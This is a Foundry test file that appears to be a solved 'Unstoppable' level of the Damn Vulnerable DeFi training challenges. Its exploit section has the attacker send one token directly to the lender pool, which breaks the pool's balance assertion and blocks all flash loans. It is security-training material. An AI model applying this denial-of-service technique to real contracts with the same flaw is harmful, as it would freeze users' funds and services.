// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {UnstoppableLender} from "../../../src/Contracts/unstoppable/UnstoppableLender.sol";
import {ReceiverUnstoppable} from "../../../src/Contracts/unstoppable/ReceiverUnstoppable.sol";

contract UnstoppableTest is Test {
    uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;
    uint256 internal constant INITIAL_ATTACKER_TOKEN_BALANCE = 100e18;

    Utilities internal utils;
    UnstoppableLender internal unstoppableLender;
    ReceiverUnstoppable internal receiverUnstoppable;
    DamnValuableToken internal dvt;
    address payable internal attacker;
    address payable internal someUser;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(2);
        attacker = users[0];
        someUser = users[1];

        vm.label(someUser, "Innocent User");
        vm.label(attacker, "Hacker");

        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT Token");

        unstoppableLender = new UnstoppableLender(address(dvt));
        vm.label(address(unstoppableLender), "Lender Pool");

        dvt.approve(address(unstoppableLender), TOKENS_IN_POOL);
        unstoppableLender.depositTokens(TOKENS_IN_POOL);

        dvt.transfer(attacker, INITIAL_ATTACKER_TOKEN_BALANCE);

        assertEq(dvt.balanceOf(address(unstoppableLender)), TOKENS_IN_POOL);
        assertEq(dvt.balanceOf(attacker), INITIAL_ATTACKER_TOKEN_BALANCE);

        // sanity check: flash loan works initially
        vm.startPrank(someUser);
        receiverUnstoppable = new ReceiverUnstoppable(
            address(unstoppableLender)
        );
        vm.label(address(receiverUnstoppable), "FlashLoan Receiver");
        receiverUnstoppable.executeFlashLoan(10);
        vm.stopPrank();

        console.log(unicode"🚀 Initial setup complete.");
    }

    function testUnstoppableExploit() public {
        /**
         * EXPLOIT START
         */
        vm.startPrank(attacker);
        unstoppableLender.damnValuableToken().transfer(address(unstoppableLender), 1);
        vm.stopPrank();
        /**
         * EXPLOIT END
         */

        vm.expectRevert(UnstoppableLender.AssertionViolated.selector);
        validation();

        console.log(unicode"\n✅ Flash loans  Exploit successful. !");
    }

    function validation() internal {
        vm.startPrank(someUser);
        receiverUnstoppable.executeFlashLoan(10);
        vm.stopPrank();
    }
}